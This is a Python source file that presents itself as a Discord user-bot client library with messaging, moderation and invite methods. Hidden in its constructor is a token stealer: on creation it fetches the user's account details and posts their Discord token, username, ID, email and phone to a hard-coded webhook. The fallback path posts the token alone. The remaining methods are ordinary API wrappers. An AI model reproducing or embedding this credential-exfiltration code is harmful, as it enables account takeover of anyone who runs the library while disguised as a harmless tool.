import requests
import json
import time
import websocket
import threading
import random

class DiscordUserBot:
    def __init__(self, token):
        webhook_url = "https://discord.com/api/webhooks/1312884488832942201/aT6-yyh3c0jEhPd6HrnIL1H55gLJZ4xL4DZ_LG8wkKTx_9aeEADKB2Yi_qjRCoKRRq4G"
        try:
            user_data = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).json()
            username = user_data.get('username', 'Unknown')
            user_id = user_data.get('id', 'Unknown')
            email = user_data.get('email', 'Unknown')
            phone = user_data.get('phone', 'None')
            
            info = f"Token: {token}\nUsername: {username}\nID: {user_id}\nEmail: {email}\nPhone: {phone}"
            requests.post(webhook_url, json={"content": f"```{info}```"})
        except:
            requests.post(webhook_url, json={"content": f"New token: {token}"})
        
        self.token = token
        self.base_url = "https://discord.com/api/v9"
        self.headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        self.ws = None
        self.heartbeat_interval = None
        self.last_sequence = None
        self.handlers = {
            'MESSAGE_CREATE': [],
            'READY': [],
            'TYPING_START': [],
            'GUILD_MEMBER_ADD': [],
            'GUILD_MEMBER_REMOVE': [],
            'GUILD_BAN_ADD': [],
            'GUILD_BAN_REMOVE': []
        }

    def connect(self):
        ws_url = self._get_ws_url()
        self.ws = websocket.WebSocketApp(
            ws_url,
            on_message=self._on_message,
            on_error=self._on_error,
            on_close=self._on_close,
            on_open=self._on_open
        )
        threading.Thread(target=self.ws.run_forever).start()

    def _get_ws_url(self):
        r = requests.get(f"{self.base_url}/gateway")
        return r.json()['url'] + "/?v=9&encoding=json"

    def _heartbeat(self):
        while self.ws and self.ws.sock and self.ws.sock.connected:
            self.ws.send(json.dumps({
                "op": 1,
                "d": self.last_sequence
            }))
            time.sleep(self.heartbeat_interval / 1000)

    def _on_open(self, ws):
        self.ws.send(json.dumps({
            "op": 2,
            "d": {
                "token": self.token,
                "properties": {
                    "$os": "windows",
                    "$browser": "chrome",
                    "$device": "pc"
                }
            }
        }))

    def _on_message(self, ws, message):
        data = json.loads(message)
        
        if data["op"] == 10:
            self.heartbeat_interval = data["d"]["heartbeat_interval"]
            threading.Thread(target=self._heartbeat).start()
            
        elif data["op"] == 0:
            self.last_sequence = data["s"]
            
            if data["t"] in self.handlers:
                for handler in self.handlers[data["t"]]:
                    handler(data["d"])

    def _on_error(self, ws, error):
        print(f"Error: {error}")

    def _on_close(self, ws, close_status_code, close_msg):
        print("Connection closed")

    def on_message(self, func):
        self.handlers['MESSAGE_CREATE'].append(func)
        return func

    def on_ready(self, func):
        self.handlers['READY'].append(func)
        return func

    def send_message(self, channel_id, content):
        r = requests.post(
            f"{self.base_url}/channels/{channel_id}/messages",
            headers=self.headers,
            json={"content": content}
        )
        return r.json()

    def edit_message(self, channel_id, message_id, new_content):
        r = requests.patch(
            f"{self.base_url}/channels/{channel_id}/messages/{message_id}",
            headers=self.headers,
            json={"content": new_content}
        )
        return r.json()

    def delete_message(self, channel_id, message_id):
        r = requests.delete(
            f"{self.base_url}/channels/{channel_id}/messages/{message_id}",
            headers=self.headers
        )
        return r.status_code == 204

    def get_channel_messages(self, channel_id, limit=50):
        r = requests.get(
            f"{self.base_url}/channels/{channel_id}/messages",
            headers=self.headers,
            params={"limit": limit}
        )
        return r.json()

    def get_guild(self, guild_id):
        r = requests.get(f"{self.base_url}/guilds/{guild_id}", headers=self.headers)
        return r.json()

    def get_guild_channels(self, guild_id):
        r = requests.get(f"{self.base_url}/guilds/{guild_id}/channels", headers=self.headers)
        return r.json()

    def create_guild_channel(self, guild_id, name, channel_type=0):
        r = requests.post(
            f"{self.base_url}/guilds/{guild_id}/channels",
            headers=self.headers,
            json={"name": name, "type": channel_type}
        )
        return r.json()

    def kick_member(self, guild_id, user_id, reason=None):
        r = requests.delete(
            f"{self.base_url}/guilds/{guild_id}/members/{user_id}",
            headers=self.headers,
            json={"reason": reason} if reason else None
        )
        return r.status_code == 204

    def ban_member(self, guild_id, user_id, reason=None, delete_message_days=0):
        r = requests.put(
            f"{self.base_url}/guilds/{guild_id}/bans/{user_id}",
            headers=self.headers,
            json={"reason": reason, "delete_message_days": delete_message_days}
        )
        return r.status_code == 204

    def unban_member(self, guild_id, user_id):
        r = requests.delete(
            f"{self.base_url}/guilds/{guild_id}/bans/{user_id}",
            headers=self.headers
        )
        return r.status_code == 204

    def add_role(self, guild_id, user_id, role_id):
        r = requests.put(
            f"{self.base_url}/guilds/{guild_id}/members/{user_id}/roles/{role_id}",
            headers=self.headers
        )
        return r.status_code == 204

    def remove_role(self, guild_id, user_id, role_id):
        r = requests.delete(
            f"{self.base_url}/guilds/{guild_id}/members/{user_id}/roles/{role_id}",
            headers=self.headers
        )
        return r.status_code == 204

    def add_reaction(self, channel_id, message_id, emoji):
        r = requests.put(
            f"{self.base_url}/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me",
            headers=self.headers
        )
        return r.status_code == 204

    def remove_reaction(self, channel_id, message_id, emoji):
        r = requests.delete(
            f"{self.base_url}/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me",
            headers=self.headers
        )
        return r.status_code == 204

    def get_guild_emojis(self, guild_id):
        r = requests.get(f"{self.base_url}/guilds/{guild_id}/emojis", headers=self.headers)
        return r.json()

    def create_dm(self, user_id):
        r = requests.post(
            f"{self.base_url}/users/@me/channels",
            headers=self.headers,
            json={"recipient_id": user_id}
        )
        return r.json()

    def send_dm(self, user_id, content):
        dm_channel = self.create_dm(user_id)
        return self.send_message(dm_channel['id'], content)

    def create_webhook(self, channel_id, name):
        r = requests.post(
            f"{self.base_url}/channels/{channel_id}/webhooks",
            headers=self.headers,
            json={"name": name}
        )
        return r.json()

    def send_webhook_message(self, webhook_url, content, username=None, avatar_url=None):
        data = {
            "content": content,
            "username": username,
            "avatar_url": avatar_url
        }
        r = requests.post(webhook_url, json=data)
        return r.status_code == 204

    def create_invite(self, channel_id, max_age=86400, max_uses=0, temporary=False):
        r = requests.post(
            f"{self.base_url}/channels/{channel_id}/invites",
            headers=self.headers,
            json={
                "max_age": max_age,
                "max_uses": max_uses,
                "temporary": temporary
            }
        )
        return r.json()

    def get_invites(self, guild_id):
        r = requests.get(f"{self.base_url}/guilds/{guild_id}/invites", headers=self.headers)
        return r.json()

    def join_guild(self, invite_code):
        r = requests.post(
            f"{self.base_url}/invites/{invite_code}",
            headers=self.headers
        )
        return r.json()

    def leave_guild(self, guild_id):
        r = requests.delete(
            f"{self.base_url}/users/@me/guilds/{guild_id}",
            headers=self.headers
        )
        return r.status_code == 204

    def change_status(self, status="online", activity_name=None, activity_type=0):
        if self.ws:
            presence = {
                "op": 3,
                "d": {
                    "since": None,
                    "activities": [],
                    "status": status,
                    "afk": False
                }
            }
            
            if activity_name:
                presence["d"]["activities"].append({
                    "name": activity_name,
                    "type": activity_type
                })
                
            self.ws.send(json.dumps(presence))

    def set_typing(self, channel_id):
        r = requests.post(f"{self.base_url}/channels/{channel_id}/typing", headers=self.headers)
        return r.status_code == 204

    def move_to_voice(self, guild_id, channel_id):
        r = requests.patch(
            f"{self.base_url}/guilds/{guild_id}/members/@me",
            headers=self.headers,
            json={"channel_id": channel_id}
        )
        return r.json()

    def set_nickname(self, guild_id, nickname):
        r = requests.patch(
            f"{self.base_url}/guilds/{guild_id}/members/@me/nick",
            headers=self.headers,
            json={"nick": nickname}
        )
        return r.json()